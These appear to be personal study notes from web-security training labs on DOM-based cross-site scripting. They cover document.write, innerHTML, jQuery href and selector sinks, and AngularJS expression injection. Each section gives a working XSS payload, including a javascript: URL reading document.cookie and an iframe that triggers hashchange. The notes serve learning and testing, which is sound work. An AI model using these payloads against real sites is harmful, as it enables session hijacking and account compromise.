# XSS examples

# sink: `document.write`, source: `location.search`

`document.write('... <script>alert(document.domain)</script> ...');`

payload:

`/?search=smn123"><script>alert('XSS+by+Vickie')%3B<%2Fscript>`

result in the code:

1.

```html
<img src="/resources/images/tracker.gif?searchTerms=smn123"> <script>alert('XSS by Vickie');</  script>
```

2. something similar: /product?productId=1&storeId=smn12</select><script>alert("q")</script>


# sink: `innerhtml`, source: `location.search`


`innerhtml` doesn't accept `<script>` or `<svg> onload`, use `<img>` or `<iframe>`.

source code:

```js
function doSerachQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
```

payload: `</span><img src=1 onerror=alert(document.domain)>`

# jQuery anchor; sink: `href` attribute , source: `location.search`


third party frameworks introduce new sources and sinks. [jQuery selectors](jQuery.md)

URL:

`https://0a99001c0357321a81887acb00d8006d.web-security-academy.net/feedback?returnPath=/`

source code:

```js
(function() {
$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```

sets whatever is in `returnPath` in the `herf` of `backLink`.
`href` is used for redirection, so we use a payload with `javascript`.

payload:

`javascript:%20alert(document.cookie)` so `https://0a99001c0357321a81887acb00d8006d.web-security-academy.net/feedback?returnPath=javascript:%20alert(document.cookie)`

result in the code:

`<a id="backLink" href="javascript: alert(document.cookie)">Back</a>`


# jQuery `selector` sink using a `hashchange` event

`$()` selector function, can be used to inject malicious objects into the DOM.
`hash` is user controllable and could be used to inject into the `$()`.

source:

`hashchange` event handler: on `hashchange`, performs the following function; uses
a *selector* to find the given fragment, then scrolls to it.
you should send the exploit to the victim so that it triggers a `hashchange` event, when it's loaded.

```js
$(window).on('hashchange', function() {
  var element = $(location.hash);
  element[0].scrollIntoView(); });
```

payload:

trigger a `hashchange` event without user interaction:

`<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">`
changes the fragment on load, activating a `hashchange` event, then the selector adds it to the DOM.

# AngularJS expression with angle brackets and double quotes HTML-encoded

* if it has `ng-app` (directive)  somewhere: then it's using angular, so you
  can run js inside {{}}. so, sending {{1+1}}, returns 2.

  but something like this: `{{alert()}}` doesn't work, perhaps because there is some
  protections.

  using this, in the search box with angle bracket encoded: `{{$eval.constructor('alert(1)')()}}`
  * the `()` in the end, call the function we defined before it.
  * more on how this works `https://www.youtube.com/watch?v=QpQp2JLn6JA`

```js
<script>
    var searchTerms = '';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```